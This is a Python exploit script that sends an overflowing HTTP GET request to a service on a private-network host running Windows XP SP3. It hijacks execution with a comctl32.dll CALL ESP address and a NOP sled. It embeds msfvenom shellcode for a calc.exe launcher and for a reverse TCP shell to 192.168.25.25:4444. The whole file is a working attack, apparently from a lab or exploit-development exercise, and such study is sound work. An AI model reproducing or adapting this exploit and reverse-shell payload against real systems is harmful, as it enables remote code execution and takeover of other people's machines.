import socket
import traceback

target = "172.16.0.199"
t_port = 90
buff = b"A" * 1786

# Windows XP SP3 English
#jmp_esp = b"\x53\x93\x42\x7E" # user32.dll JMP ESP 7E429353
#jmp_esp = b"\x69\x2D\xB3\x7C" # shell32.dll JMP ESP 7CB32D69
jmp_esp = b"\x61\xA5\x09\x5D"  # comctl32.dll CALL ESP 5D09A561

# Badchars = \x00\x0d

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.25.25 LPORT=4444 -b "\x00\x0d" -f python -v shellcode1
shellcode1 =  b""
shellcode1 += b"\xbf\x29\x26\x38\x96\xdb\xc9\xd9\x74\x24\xf4"
shellcode1 += b"\x5a\x31\xc9\xb1\x52\x31\x7a\x12\x03\x7a\x12"
shellcode1 += b"\x83\xeb\x22\xda\x63\x17\xc2\x98\x8c\xe7\x13"
shellcode1 += b"\xfd\x05\x02\x22\x3d\x71\x47\x15\x8d\xf1\x05"
shellcode1 += b"\x9a\x66\x57\xbd\x29\x0a\x70\xb2\x9a\xa1\xa6"
shellcode1 += b"\xfd\x1b\x99\x9b\x9c\x9f\xe0\xcf\x7e\xa1\x2a"
shellcode1 += b"\x02\x7f\xe6\x57\xef\x2d\xbf\x1c\x42\xc1\xb4"
shellcode1 += b"\x69\x5f\x6a\x86\x7c\xe7\x8f\x5f\x7e\xc6\x1e"
shellcode1 += b"\xeb\xd9\xc8\xa1\x38\x52\x41\xb9\x5d\x5f\x1b"
shellcode1 += b"\x32\x95\x2b\x9a\x92\xe7\xd4\x31\xdb\xc7\x26"
shellcode1 += b"\x4b\x1c\xef\xd8\x3e\x54\x13\x64\x39\xa3\x69"
shellcode1 += b"\xb2\xcc\x37\xc9\x31\x76\x93\xeb\x96\xe1\x50"
shellcode1 += b"\xe7\x53\x65\x3e\xe4\x62\xaa\x35\x10\xee\x4d"
shellcode1 += b"\x99\x90\xb4\x69\x3d\xf8\x6f\x13\x64\xa4\xde"
shellcode1 += b"\x2c\x76\x07\xbe\x88\xfd\xaa\xab\xa0\x5c\xa3"
shellcode1 += b"\x18\x89\x5e\x33\x37\x9a\x2d\x01\x98\x30\xb9"
shellcode1 += b"\x29\x51\x9f\x3e\x4d\x48\x67\xd0\xb0\x73\x98"
shellcode1 += b"\xf9\x76\x27\xc8\x91\x5f\x48\x83\x61\x5f\x9d"
shellcode1 += b"\x04\x31\xcf\x4e\xe5\xe1\xaf\x3e\x8d\xeb\x3f"
shellcode1 += b"\x60\xad\x14\xea\x09\x44\xef\x7d\xf6\x31\xf6"
shellcode1 += b"\x64\x9e\x43\x08\x86\x02\xcd\xee\xc2\xaa\x9b"
shellcode1 += b"\xb9\x7a\x52\x86\x31\x1a\x9b\x1c\x3c\x1c\x17"
shellcode1 += b"\x93\xc1\xd3\xd0\xde\xd1\x84\x10\x95\x8b\x03"
shellcode1 += b"\x2e\x03\xa3\xc8\xbd\xc8\x33\x86\xdd\x46\x64"
shellcode1 += b"\xcf\x10\x9f\xe0\xfd\x0b\x09\x16\xfc\xca\x72"
shellcode1 += b"\x92\xdb\x2e\x7c\x1b\xa9\x0b\x5a\x0b\x77\x93"
shellcode1 += b"\xe6\x7f\x27\xc2\xb0\x29\x81\xbc\x72\x83\x5b"
shellcode1 += b"\x12\xdd\x43\x1d\x58\xde\x15\x22\xb5\xa8\xf9"
shellcode1 += b"\x93\x60\xed\x06\x1b\xe5\xf9\x7f\x41\x95\x06"
shellcode1 += b"\xaa\xc1\xa5\x4c\xf6\x60\x2e\x09\x63\x31\x33"
shellcode1 += b"\xaa\x5e\x76\x4a\x29\x6a\x07\xa9\x31\x1f\x02"
shellcode1 += b"\xf5\xf5\xcc\x7e\x66\x90\xf2\x2d\x87\xb1"

# msfvenom -p windows/exec CMD="calc.exe" -b "\x00\x0d" -f python -v shellcode2
shellcode2 =  b""
shellcode2 += b"\xd9\xf6\xbd\x6a\x93\xdc\x9f\xd9\x74\x24"
shellcode2 += b"\xf4\x5e\x31\xc9\xb1\x31\x83\xc6\x04\x31"
shellcode2 += b"\x6e\x14\x03\x6e\x7e\x71\x29\x63\x96\xf7"
shellcode2 += b"\xd2\x9c\x66\x98\x5b\x79\x57\x98\x38\x09"
shellcode2 += b"\xc7\x28\x4a\x5f\xeb\xc3\x1e\x74\x78\xa1"
shellcode2 += b"\xb6\x7b\xc9\x0c\xe1\xb2\xca\x3d\xd1\xd5"
shellcode2 += b"\x48\x3c\x06\x36\x71\x8f\x5b\x37\xb6\xf2"
shellcode2 += b"\x96\x65\x6f\x78\x04\x9a\x04\x34\x95\x11"
shellcode2 += b"\x56\xd8\x9d\xc6\x2e\xdb\x8c\x58\x25\x82"
shellcode2 += b"\x0e\x5a\xea\xbe\x06\x44\xef\xfb\xd1\xff"
shellcode2 += b"\xdb\x70\xe0\x29\x12\x78\x4f\x14\x9b\x8b"
shellcode2 += b"\x91\x50\x1b\x74\xe4\xa8\x58\x09\xff\x6e"
shellcode2 += b"\x23\xd5\x8a\x74\x83\x9e\x2d\x51\x32\x72"
shellcode2 += b"\xab\x12\x38\x3f\xbf\x7d\x5c\xbe\x6c\xf6"
shellcode2 += b"\x58\x4b\x93\xd9\xe9\x0f\xb0\xfd\xb2\xd4"
shellcode2 += b"\xd9\xa4\x1e\xba\xe6\xb7\xc1\x63\x43\xb3"
shellcode2 += b"\xef\x70\xfe\x9e\x65\x86\x8c\xa4\xcb\x88"
shellcode2 += b"\x8e\xa6\x7b\xe1\xbf\x2d\x14\x76\x40\xe4"
shellcode2 += b"\x51\x88\x0a\xa5\xf3\x01\xd3\x3f\x46\x4c"
shellcode2 += b"\xe4\x95\x84\x69\x67\x1c\x74\x8e\x77\x55"
shellcode2 += b"\x71\xca\x3f\x85\x0b\x43\xaa\xa9\xb8\x64"
shellcode2 += b"\xff\xc9\x5f\xf7\x63\x20\xfa\x7f\x01\x3c"

nops = b"\x90" * 20


try:
	payload = b"GET /" + buff + jmp_esp + nops + shellcode2 + b" HTTP/1.1\r\n\r\n"
	print("Sending %s bytes" % len(payload))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, t_port))
	s.send(payload)
	s.recv(1024)
	s.close()

except:
	traceback.print_exc()
	exit()
